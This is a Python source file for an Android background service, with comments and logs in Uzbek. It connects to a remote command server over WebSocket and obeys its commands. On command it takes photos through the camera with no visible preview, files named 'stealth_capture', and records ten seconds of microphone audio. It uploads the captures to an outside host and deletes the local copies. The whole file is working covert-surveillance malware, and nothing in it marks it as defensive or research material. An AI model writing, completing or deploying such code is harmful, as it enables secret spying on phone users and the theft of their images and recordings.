import asyncio
import os
import websockets
import aiohttp
from jnius import autoclass, PythonJavaClass, java_method

WS_URL = "ws://YOUR_RENDER_APP_URL.onrender.com/ws/device"
UPLOAD_URL = "https://YOUR_RENDER_APP_URL.onrender.com/upload"

PythonService = autoclass('org.kivy.android.PythonService')
mService = PythonService.mService
Camera = autoclass('android.hardware.Camera')
SurfaceTexture = autoclass('android.graphics.SurfaceTexture')
FileOutputStream = autoclass('java.io.FileOutputStream')
MediaRecorder = autoclass('android.media.MediaRecorder')
AudioSource = autoclass('android.media.MediaRecorder$AudioSource')
OutputFormat = autoclass('android.media.MediaRecorder$OutputFormat')
AudioEncoder = autoclass('android.media.MediaRecorder$AudioEncoder')

class PictureCallback(PythonJavaClass):
    __javainterfaces__ = ['android/hardware/Camera$PictureCallback']
    __javacontext__ = 'app'

    def __init__(self):
        super(PictureCallback, self).__init__()
        self.photo_path = None
        self.is_done = False

    @java_method('(L[BLandroid/hardware/Camera;)V')
    def onPictureTaken(self, data, camera_inst):
        filepath = os.path.join(mService.getExternalFilesDir(None).getAbsolutePath(), "stealth_capture.jpg")
        try:
            fos = FileOutputStream(filepath)
            fos.write(data)
            fos.close()
            self.photo_path = filepath
        except Exception as e:
            print("Error saving stealth photo:", e)
        finally:
            camera_inst.stopPreview()
            camera_inst.release()
            self.is_done = True

def take_stealth_photo():
    try:
        camera = Camera.open(0) 
        texture = SurfaceTexture(10)
        camera.setPreviewTexture(texture)
        camera.startPreview()
        cb = PictureCallback()
        camera.takePicture(None, None, cb)
        return cb
    except Exception as e:
        print("Camera access failed:", e)
        return None

def start_audio_record():
    filepath = os.path.join(mService.getExternalFilesDir(None).getAbsolutePath(), "stealth_audio.m4a")
    recorder = MediaRecorder()
    try:
        recorder.setAudioSource(AudioSource.MIC)
        recorder.setOutputFormat(OutputFormat.MPEG_4)
        recorder.setAudioEncoder(AudioEncoder.AAC)
        recorder.setOutputFile(filepath)
        recorder.prepare()
        recorder.start()
        return recorder, filepath
    except Exception as e:
        print("Audio recording failed:", e)
        return None, None

async def upload_media(file_path, media_type):
    try:
        async with aiohttp.ClientSession() as session:
            with open(file_path, 'rb') as f:
                data = aiohttp.FormData()
                filename = os.path.basename(file_path)
                data.add_field('file', f, filename=filename)
                data.add_field('media_type', media_type)
                async with session.post(UPLOAD_URL, data=data) as resp:
                    print("Upload Status:", resp.status)
    except Exception as e:
        print(f"Upload error: {e}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

async def ws_loop():
    while True:
        try:
            print("Serverga ulanilmoqda...")
            async with websockets.connect(WS_URL, ping_interval=20, ping_timeout=20) as ws:
                print("Ulanish muvaffaqiyatli!")
                while True:
                    msg = await ws.recv()
                    print(f"Serverdan buyruq keldi: {msg}")
                    
                    if msg == "take_photo":
                        cb = take_stealth_photo()
                        if cb:
                            for _ in range(20):
                                if cb.is_done:
                                    break
                                await asyncio.sleep(0.5)
                            if getattr(cb, 'photo_path', None) and os.path.exists(cb.photo_path):
                                await upload_media(cb.photo_path, "photo")
                                
                    elif msg == "record_audio":
                        recorder, path = start_audio_record()
                        if recorder:
                            await asyncio.sleep(10) # 10 soniya yozish
                            try:
                                recorder.stop()
                                recorder.release()
                            except:
                                pass
                            if os.path.exists(path):
                                await upload_media(path, "audio")

                    elif msg == "record_video":
                        # Video uchun placeholder (Video yozish UI-siz murakkabroq, hozircha rasm olinadi)
                        print("Video yozish hozircha rasm bilan cheklangan")
                        cb = take_stealth_photo()
                        if cb:
                            for _ in range(20):
                                if cb.is_done: break
                                await asyncio.sleep(0.5)
                            if getattr(cb, 'photo_path', None):
                                await upload_media(cb.photo_path, "photo")

        except Exception as e:
            print(f"Ulanishda xatolik: {e}. 5 soniyadan so'ng qayta ulaniladi...")
            await asyncio.sleep(5)

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(ws_loop())
